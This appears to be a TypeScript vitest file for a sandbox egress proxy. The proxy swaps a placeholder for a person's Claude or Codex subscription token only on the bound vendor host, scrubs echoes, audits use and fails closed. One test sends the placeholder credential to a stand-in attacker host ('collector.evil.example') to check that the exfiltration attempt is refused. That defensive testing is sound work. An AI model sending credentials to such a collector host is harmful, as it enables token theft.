// A `todo` box's agent reaching its vendor (decision 0132, worker/secrets/SandboxEgress.ts `forwardSubscription`): the box
// holds a placeholder, and the egress swaps it for the person's credential on the bound host only, scrubs echoes, and
// keeps the connection's refusal up to date. Postgres is the compose one; the vendor is scripted at the network.
import { Effect, Option, Redacted } from "effect"
import { SqlClient } from "effect/sql"
import { afterAll, beforeAll, beforeEach, describe, expect, test } from "vitest"
import * as TestDatabase from "../../db/TestDatabase.ts"
import * as Database from "../../db/Database.ts"
import * as Agents from "../personal/Agents.ts"
import type * as Codex from "../personal/Codex.ts"
import * as Subscriptions from "../personal/Subscriptions.ts"
import * as SecretsStore from "./Store.ts"
import { dump, engine, KEY, leaks, personalHarness, resetModels, rows, seedKeys } from "../personal/test/harness.ts"
import { CODEX_ACCESS, CODEX_REFRESH } from "../personal/test/provider.ts"
import { testFile } from "../test/harness.ts"
import { SecretKeys } from "./Keys.ts"
import * as SandboxEgress from "./SandboxEgress.ts"

const runtime = testFile("subscription_egress")
let host: Awaited<ReturnType<typeof engine>>
beforeAll(async () => {
  host = await engine(runtime)
})
afterAll(() => host.close())
beforeEach(async () => {
  await resetModels(runtime)
  await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) => sql`TRUNCATE secret_events`))
})

const CLAUDE_TOKEN = "sk-ant-oat01-SENTINEL-claude"
const guest: SandboxEgress.Guest = { repoId: "github/acme/widgets", branchId: "branch-1", generation: 1 }

const keys = () =>
  Effect.runPromise(Effect.service(SecretKeys).pipe(Effect.provide(SecretKeys.layer(KEY)))).then(Option.getOrThrow)

/** The vendor, scripted: `status` answers each request, and `echo` is sent back in its headers and body. */
const vendor = (status = 200, echo?: string) => {
  const seen: Array<Request> = []
  const fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = new Request(input, init)
    seen.push(request)
    return new Response(`answered ${echo ?? ""}`, { status, headers: { "x-echo": echo ?? "" } })
  }) as typeof globalThis.fetch
  return { fetch, seen }
}

/** The person's Claude subscription, as the box's object holds it. */
const claude = async (person = "person-member") => {
  const [connectionId] = await seedKeys(runtime, person, [{ kind: "claude_subscription", key: CLAUDE_TOKEN }])
  const subscription = Option.getOrThrow(await runtime.runPromise(Subscriptions.of(person, await keys())))
  expect(subscription.connectionId).toBe(connectionId)
  return subscription
}

const bearer = (placeholder: string, url = "https://api.anthropic.com/v1/messages") =>
  new Request(url, { method: "POST", headers: { authorization: `Bearer ${placeholder}` }, body: "{}" })

const open = (upstream: ReturnType<typeof vendor>, options: Parameters<typeof personalHarness>[2] = {}) =>
  personalHarness(runtime, host.starter, { provider: upstream.fetch, ...options })

const audit = () =>
  runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) =>
    sql<{ readonly host: string; readonly outcome: string; readonly names: ReadonlyArray<string>; readonly scope: string }>`
      SELECT host, outcome, names, scope FROM secret_events WHERE action = 'use' ORDER BY id`))

describe("forwardSubscription", () => {
  test("an unreadable repository policy fails closed before opening or sending the subscription", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const upstream = vendor()
    const database = Database.layer(Effect.succeed(Redacted.make("postgresql://smithers:smithers@127.0.0.1:1/smithers")))
    const h = await open(upstream, { database })
    const answer = await h.subscriptionEgress(guest, subscription)(bearer(placeholder))
    expect([answer.status, await answer.text()]).toEqual([503, "unavailable"])
    expect(upstream.seen).toEqual([])
  })
  test("swaps the placeholder for the Claude token on the bound host, and the box never sees it", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    expect(placeholder).not.toContain(CLAUDE_TOKEN)
    const upstream = vendor(200)
    const h = await open(upstream)
    const answer = await h.subscriptionEgress(guest, subscription)(bearer(placeholder))
    expect([answer.status, (await answer.text()).trim()]).toEqual([200, "answered"])
    expect(upstream.seen.map((request) => [request.url, request.headers.get("authorization")])).toEqual([
      ["https://api.anthropic.com/v1/messages", `Bearer ${CLAUDE_TOKEN}`],
    ])
    expect(await audit()).toEqual([{
      host: "api.anthropic.com",
      outcome: "forwarded",
      names: [`connection:${subscription.connectionId}`],
      scope: "branch-1:1",
    }])
    expect(leaks(h.recorded(), [CLAUDE_TOKEN])).toEqual([])
    expect(h.spans.map((span) => span.name)).toContain("secrets.egress.subscription")
  })

  test("a Codex subscription sends only its access token, to chatgpt.com, opened per request", async () => {
    const credential: Codex.Credential = {
      accessToken: `${CODEX_ACCESS}-1`,
      refreshToken: `${CODEX_REFRESH}-1`,
      idToken: "e30.e30.x",
      accountId: "acct",
      planType: "plus",
      expiresAt: Date.now() + 60_000,
    }
    await seedKeys(runtime, "person-member", [{ kind: "codex_subscription", key: JSON.stringify(credential) }])
    const subscription = Option.getOrThrow(await runtime.runPromise(Subscriptions.of("person-member", await keys())))
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const upstream = vendor(200)
    const h = await open(upstream)
    await h.subscriptionEgress(guest, subscription)(bearer(placeholder, "https://chatgpt.com/backend-api/codex/responses"))
    expect(upstream.seen.map((request) => request.headers.get("authorization"))).toEqual([`Bearer ${CODEX_ACCESS}-1`])
    expect(subscription.hosts).toEqual(Agents.CODEX_HOSTS)
  })

  test("refuses every other host, with or without the placeholder, and sends nothing", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const upstream = vendor(200)
    const box = (await open(upstream)).subscriptionEgress(guest, subscription)
    const stolen = await box(bearer(placeholder, "https://collector.evil.example/"))
    expect([stolen.status, await stolen.text()]).toEqual([403, "host_not_allowed"])
    expect((await box(new Request("https://chatgpt.com/"))).status).toBe(403)
    expect(upstream.seen).toEqual([])
    expect((await audit()).map((row) => row.outcome)).toEqual(["host_not_allowed", "host_not_allowed"])
  })

  test("a placeholder of another generation or branch is unknown here", async () => {
    const subscription = await claude()
    const earlier = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder({ ...guest, generation: 0 }, await keys(), subscription))
    const upstream = vendor(200)
    const answer = await (await open(upstream)).subscriptionEgress(guest, subscription)(bearer(earlier))
    expect([answer.status, await answer.text()]).toEqual([403, "unknown_placeholder"])
    expect(upstream.seen).toEqual([])
  })

  test("scrubs the credential from what the vendor echoes", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const h = await open(vendor(200, CLAUDE_TOKEN))
    const answer = await h.subscriptionEgress(guest, subscription)(bearer(placeholder))
    const seenByBox = `${await answer.text()} ${answer.headers.get("x-echo")}`
    expect(seenByBox).not.toContain(CLAUDE_TOKEN)
    expect(leaks(seenByBox, [CLAUDE_TOKEN])).toEqual([])
  })

  test("a refusal marks the connection, only that one, and only a change writes; 200 clears it", async () => {
    const subscription = await claude()
    const [other] = await seedKeys(runtime, "person-admin", [{ kind: "claude_subscription", key: CLAUDE_TOKEN }])
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const through = async (status: number) => {
      const answer = await (await open(vendor(status))).subscriptionEgress(guest, subscription)(bearer(placeholder))
      expect(answer.status).toBe(status)
      await answer.text()
      return (await rows(runtime)).find((row) => row.id === subscription.connectionId)!
    }
    const refused = await through(401)
    expect(refused).toMatchObject({ failureStatus: 401, failedAt: expect.any(Date) })
    // The same status again leaves the row as it stood.
    expect((await through(401)).failedAt).toEqual(refused.failedAt)
    expect((await through(402)).failureStatus).toBe(402)
    expect((await through(403)).failureStatus).toBe(403)
    // A rate limit and a vendor's own trouble say nothing of the token.
    expect((await through(429)).failureStatus).toBe(403)
    expect((await through(500)).failureStatus).toBe(403)
    expect(await through(200)).toMatchObject({ failureStatus: null, failedAt: null })
    expect((await rows(runtime)).find((row) => row.id === other)!.failureStatus).toBeNull()
  })

  test("a request that doesn't use the credential says nothing of the connection, whatever the vendor answers", async () => {
    const subscription = await claude()
    const upstream = vendor(401)
    const h = await open(upstream)
    const unauthenticated = new Request("https://api.anthropic.com/v1/messages", { method: "POST", body: "{}" })
    const answer = await h.subscriptionEgress(guest, subscription)(unauthenticated)
    expect(answer.status).toBe(401)
    await answer.text()
    expect(upstream.seen).toHaveLength(1)
    const [row] = await rows(runtime)
    expect(row).toMatchObject({ failureStatus: null, failedAt: null })
  })

  test("a repository secret bound to the same host still goes through, and says nothing of the connection", async () => {
    const subscription = await claude()
    const name = "ANTHROPIC_API_KEY"
    const value = "sk-ant-api03-SENTINEL-repository"
    const opened = await keys()
    const sealed = await Effect.runPromise(opened.cipher.seal(Redacted.make(value), { id: guest.repoId, name, version: opened.version }))
    await runtime.runPromise(SecretsStore.put({
      repoId: guest.repoId,
      name,
      ...sealed,
      keyVersion: opened.version,
      hosts: ["api.anthropic.com"],
      methods: undefined,
      actorId: "person-admin",
      invocationKey: `repository-secret-${crypto.randomUUID()}`,
    }))
    const placeholder = await Effect.runPromise(opened.minter.derive(SandboxEgress.scopeOf(guest), name))
    const upstream = vendor(401)
    const h = await open(upstream)
    const answer = await h.subscriptionEgress(guest, subscription)(bearer(placeholder))
    expect(answer.status).toBe(401)
    await answer.text()
    expect(upstream.seen.map((request) => request.headers.get("authorization"))).toEqual([`Bearer ${value}`])
    const [row] = await rows(runtime)
    expect(row).toMatchObject({ failureStatus: null, failedAt: null })
  })

  test("refuses once the connection is removed or turned off, without reaching the vendor", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const upstream = vendor(200)
    const box = (await open(upstream)).subscriptionEgress(guest, subscription)
    await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) => sql`UPDATE personal_models SET active = false`))
    const off = await box(bearer(placeholder))
    expect(off.status).toBe(503)
    await resetModels(runtime)
    const removed = await box(bearer(placeholder))
    expect([removed.status, await removed.text()]).toEqual([off.status, await off.text()])
    expect(upstream.seen).toEqual([])
  })

  test("Postgres that can't open the credential sends nothing", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const upstream = vendor(200)
    const box = (await open(upstream)).subscriptionEgress(guest, subscription)
    await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) => sql`ALTER TABLE personal_models RENAME TO models_gone`))
    try {
      expect((await box(bearer(placeholder))).status).toBe(503)
      expect(upstream.seen).toEqual([])
    } finally {
      await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) => sql`ALTER TABLE models_gone RENAME TO personal_models`))
    }
  })

  test("a credential sealed under another key is never sent", async () => {
    await seedKeys(runtime, "person-member", [{ kind: "claude_subscription", key: CLAUDE_TOKEN }], Redacted.make("f".repeat(64)))
    const subscription = Option.getOrThrow(await runtime.runPromise(Subscriptions.of("person-member", await keys())))
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const upstream = vendor(200)
    expect((await (await open(upstream)).subscriptionEgress(guest, subscription)(bearer(placeholder))).status).toBe(503)
    expect(upstream.seen).toEqual([])
  })

  test("with secrets off the box reaches nothing", async () => {
    const subscription = await claude()
    const upstream = vendor(200)
    const answer = await (await open(upstream, { keys: false })).subscriptionEgress(guest, subscription)(bearer("anything"))
    expect([answer.status, await answer.text()]).toEqual([503, "off"])
    expect(upstream.seen).toEqual([])
  })

  test("no credential reaches a table in plaintext, the journal or a record", async () => {
    const subscription = await claude()
    const placeholder = await Effect.runPromise(SandboxEgress.subscriptionPlaceholder(guest, await keys(), subscription))
    const h = await open(vendor(401, CLAUDE_TOKEN))
    await (await h.subscriptionEgress(guest, subscription)(bearer(placeholder))).text()
    const schema = (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).name
    expect(leaks(await dump(runtime, schema), [CLAUDE_TOKEN])).toEqual([])
    expect(leaks(await dump(runtime, host.schema), [CLAUDE_TOKEN])).toEqual([])
    expect(leaks(h.recorded(), [CLAUDE_TOKEN])).toEqual([])
  })
})
